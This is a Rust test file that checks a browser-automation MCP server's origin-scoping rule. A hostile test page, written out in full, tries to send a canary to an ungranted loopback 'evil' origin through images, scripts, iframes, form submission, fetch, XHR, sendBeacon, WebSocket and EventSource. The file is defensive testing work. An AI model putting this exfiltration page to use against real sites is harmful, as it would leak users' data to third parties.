//! W6.S1 gate: ONE egress law. A hostile page on origin A (granted) tries to ship a canary to origin B
//! (not granted) through every channel a page has: <img>, <link>, <script src>, <iframe>, an auto-submitted
//! form, fetch GET/POST, XHR, sendBeacon, WebSocket, EventSource. Two loopback origins count every request
//! they receive. Law ON (`--read-origins A --write-origins A`): B's counter must stay 0 on BOTH backends while A
//! still loads (the law must not be "block everything"). Law OFF (no flags): B receives the canary, so the PoC is real.
//! `MANUK_SCOPE_MUTATE=1` removes the subresource check; the law-on tests must go red under it.

use std::io::{BufRead, BufReader, Read, Write};
use std::net::TcpListener;
use std::process::{Child, ChildStdin, ChildStdout, Command, Stdio};
use std::sync::{Arc, Mutex};

use serde_json::{json, Value};

type Log = Arc<Mutex<Vec<String>>>;

fn serve(evil: String) -> (String, Log) {
    let log: Log = Arc::default();
    let l = TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = l.local_addr().unwrap();
    let lg = log.clone();
    std::thread::spawn(move || {
        for s in l.incoming() {
            let Ok(mut s) = s else { continue };
            let (lg, evil) = (lg.clone(), evil.clone());
            std::thread::spawn(move || {
                let mut buf = [0u8; 8192];
                let n = s.read(&mut buf).unwrap_or(0);
                let first = String::from_utf8_lossy(&buf[..n]).lines().next().unwrap_or("").to_string();
                let mut it = first.split_whitespace();
                let (m, p) = (it.next().unwrap_or(""), it.next().unwrap_or(""));
                if p == "/favicon.ico" {
                    return;
                }
                lg.lock().unwrap().push(format!("{m} {p}"));
                let (ct, body) = if p == "/" {
                    ("text/html", page(&evil))
                } else if p.starts_with("/css") {
                    ("text/css", "body{}".to_string())
                } else if p.starts_with("/js") {
                    ("text/javascript", "".to_string())
                } else if p.starts_with("/frame") {
                    ("text/html", "<p>frame</p>".to_string())
                } else {
                    ("text/plain", "ok".to_string())
                };
                let _ = write!(s, "HTTP/1.1 200 OK\r\nContent-Type: {ct}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}", body.len());
            });
        }
    });
    (format!("http://{addr}"), log)
}

fn page(evil: &str) -> String {
    let ws = evil.replacen("http://", "ws://", 1);
    format!(
        r#"<!doctype html><html><head><title>Theft</title>
<link rel="stylesheet" href="{evil}/css?c=CANARY"><script src="{evil}/js?c=CANARY"></script></head><body>
<h1>Theft page</h1><img src="{evil}/img?c=CANARY"><iframe src="{evil}/frame?c=CANARY"></iframe>
<form id="f" method="post" action="{evil}/form"><input name="c" value="CANARY"></form>
<script>
var v='CANARY';
fetch('{evil}/fetch-get?c='+v).catch(function(){{}});
fetch('{evil}/fetch-post',{{method:'POST',body:v}}).catch(function(){{}});
try{{var x=new XMLHttpRequest();x.open('POST','{evil}/xhr');x.send(v);}}catch(e){{}}
try{{navigator.sendBeacon('{evil}/beacon',v);}}catch(e){{}}
try{{var w=new WebSocket('{ws}/ws');w.onopen=function(){{w.send(v)}};}}catch(e){{}}
try{{new EventSource('{evil}/es?d='+v);}}catch(e){{}}
try{{document.getElementById('f').submit();}}catch(e){{}}
fetch('/own').catch(function(){{}});
</script></body></html>"#
    )
}

struct Client {
    child: Child,
    tx: ChildStdin,
    rx: BufReader<ChildStdout>,
    id: u64,
}

impl Client {
    fn start(chrome: bool, flags: &[String]) -> Client {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_manuk-mcp"));
        cmd.args(flags);
        if chrome {
            cmd.args(["--backend", "chrome"]);
        }
        cmd.env(
            "MANUK_ACTLOG_DIR",
            std::env::temp_dir().join(format!("w6s1-log-{}-{chrome}", std::process::id())),
        );
        cmd.arg("--allow-write").arg(std::env::temp_dir());
        let mut child = cmd
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .spawn()
            .expect("spawn manuk-mcp");
        let tx = child.stdin.take().unwrap();
        let rx = BufReader::new(child.stdout.take().unwrap());
        let mut c = Client {
            child,
            tx,
            rx,
            id: 0,
        };
        c.rpc("initialize", json!({"protocolVersion": "2025-03-26", "capabilities": {}, "clientInfo": {"name": "t", "version": "0"}}));
        c.send(json!({"jsonrpc": "2.0", "method": "notifications/initialized"}));
        c
    }
    fn send(&mut self, v: Value) {
        writeln!(self.tx, "{v}").unwrap();
        self.tx.flush().unwrap();
    }
    fn rpc(&mut self, method: &str, params: Value) -> Value {
        self.id += 1;
        let id = self.id;
        self.send(json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params}));
        loop {
            let mut line = String::new();
            assert!(
                self.rx.read_line(&mut line).unwrap() > 0,
                "server closed stdout"
            );
            let v: Value = serde_json::from_str(&line).unwrap();
            if v["id"] == json!(id) {
                return v;
            }
        }
    }
    fn call(&mut self, name: &str, args: Value) -> (bool, String) {
        let r = self.rpc("tools/call", json!({"name": name, "arguments": args}));
        let res = &r["result"];
        let blocks = res["content"].as_array().cloned().unwrap_or_default();
        (
            res["isError"].as_bool().unwrap_or(false),
            blocks
                .iter()
                .filter_map(|b| b["text"].as_str())
                .collect::<Vec<_>>()
                .join("\n"),
        )
    }
}
impl Drop for Client {
    fn drop(&mut self) {
        let _ = self.child.kill();
    }
}


fn theft(chrome: bool, law: bool) -> (Vec<String>, Vec<String>) {
    let (evil, evil_log) = serve(String::new());
    let (app, app_log) = serve(evil.clone());
    let mut flags: Vec<String> = vec![];
    if law {
        flags.extend(["--read-origins".into(), app.clone(), format!("--write-origins={app}")]);
    }
    let mut c = Client::start(chrome, &flags);
    let _ = c.call("navigate", json!({"url": format!("{app}/")}));
    std::thread::sleep(std::time::Duration::from_millis(2500));
    let _ = c.call("observe", json!({}));
    std::thread::sleep(std::time::Duration::from_millis(500));
    let e = evil_log.lock().unwrap().clone();
    let a = app_log.lock().unwrap().clone();
    (e, a)
}

fn law_on(chrome: bool) {
    let (evil, app) = theft(chrome, true);
    assert!(app.iter().any(|l| l == "GET /"), "the granted origin must still load: {app:?}");
    assert!(evil.is_empty(), "cross-origin theft got through with the law on (chrome={chrome}): {evil:?}");
}

fn control(chrome: bool, need: &[&str]) {
    let (evil, _) = theft(chrome, false);
    for n in need {
        assert!(
            evil.iter().any(|l| l.contains(n)),
            "control: with the law off the PoC must reach B via {n} (chrome={chrome}); B saw {evil:?}"
        );
    }
}

#[test]
fn law_on_manuk_backend_theft_reaches_nothing() {
    law_on(false);
}
#[test]
fn law_on_chrome_backend_theft_reaches_nothing() {
    law_on(true);
}
#[test]
fn law_off_manuk_backend_control_is_a_real_theft() {
    control(false, &["/img", "/fetch-get", "/fetch-post", "/beacon"]);
}
#[test]
fn law_off_chrome_backend_control_is_a_real_theft() {
    control(true, &["/img", "/fetch-get", "/fetch-post", "/beacon", "/ws"]);
}
